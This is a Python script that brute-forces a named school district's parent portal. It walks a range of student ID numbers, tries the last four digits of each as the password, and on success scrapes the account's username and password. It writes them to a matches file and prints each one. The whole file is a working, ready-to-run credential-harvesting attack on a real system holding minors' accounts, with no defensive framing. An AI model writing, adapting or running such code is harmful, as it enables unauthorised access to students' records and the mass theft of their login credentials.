from colored import fg, attr
import mechanize
from bs4 import BeautifulSoup
import time

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# Set colors
green = fg('#00FF00')
red = fg('#FF0000')
orange = fg('#FFFF00')
res = attr('reset')


# Set user class
class user:
    firstname = "N/A"
    lastname = "N/A"
    studentid = "N/A"
    username = "N/A"
    password = "N/A"
    birthmonth = "N/A"
    school = "N/A"
    fullname = "N/A"


# Set smurf class
class smurf:
    id = "N/A"
    full = "N/A"
    randid = "N/A"


# Declare vars
user = user()
domain = "https://dashboard.okaloosaschools.com"


# Declare custom strip function
def downwithit(string, firstHalf, secondHalf):
    string = str(string)
    format1 = string.replace(str(firstHalf), "")
    format2 = format1.replace(str(secondHalf), "")
    return format2


# Main function
for x in range(4630051162, 4699999999):
    br.open(domain + "/parentportal/PP000.pgm")
    br.select_form(nr=0)
    user.studentid = str(x)
    br.form['wrkuser'] = user.studentid
    br.form['wrkpasswd'] = user.studentid[-4:]
    print("[RUN] Checking %s..." % user.studentid)
    response = br.submit()
    try:
        br.select_form(nr=0)
    except mechanize._mechanize.FormNotFoundError:
        start = time.time()
        print("[RUN] " + green
              + "Found " + user.fullname + "..." + res)
        soup = BeautifulSoup(br.response().read(), 'lxml')
        redirect = str(soup)[63:146]
        dashboard = domain + redirect
        br.open(dashboard)
        soup = BeautifulSoup(br.response().read(), 'lxml')

        # Get username/password
        tempCombo = []
        for span in soup.select("td span"):
            tempCombo.append(span.text)
        user.username = tempCombo[0]
        user.password = tempCombo[1]
        smurf.id = dashboard[69:101]
        finalSmurf = domain + "/parentportal/PP013.pgm?SmurfId= " + \
            smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"

        # Write to file
        f = open("./assets/matches.txt", "a")
        f.write("Student ID: " + user.studentid + "\nUsername: "
                + user.username + "\nPassword: " + user.password + "\n\n")
        f.close()

        # Time
        end = time.time()
        delta = str(round(end - start, 2))
        print(" L " + green + "Scraped " + user.studentid + "..." + res)
        print(" L " + green + "Scraped " + user.username + "..." + res)
        print(" L " + green + "Scraped " + user.password + "..." + res)
        print(" L " + green + "Scraped " + smurf.id + "..." + res)
        print(" L " + orange + "Took " + delta + "s to process match..." + res)
        pass
